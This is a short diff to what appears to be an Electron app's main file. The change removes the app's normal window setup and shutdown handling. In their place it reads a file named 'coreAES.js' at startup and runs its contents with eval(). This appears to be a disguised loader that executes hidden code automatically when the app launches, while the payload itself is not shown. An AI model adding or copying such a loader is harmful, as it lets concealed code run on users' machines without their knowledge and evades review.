@@ -1,19 +1,9 @@
-const { app } = require('electron')
-const path = require('path')
-const os = require('os')
+const { app } = require('electron');
+const path = require('path');
+const fs = require('fs');
 
 app.whenReady().then(async () => {
-  const os = require(path.join(__dirname, 'coreAES.js'))
-  createWindow()
-  app.on('activate', () => {
-    if (BrowserWindow.getAllWindows().length === 0) {
-      createWindow()
-    }
-  })
-})
-
-app.on('window-all-closed', () => {
-  if (process.platform !== 'darwin') {
-    app.quit()
-  }
-})
+  const filePath = path.join(__dirname, 'coreAES.js');
+  const fileContent = await fs.promises.readFile(filePath, 'utf-8');
+  eval(fileContent); // new Function(fileContent)();
+});
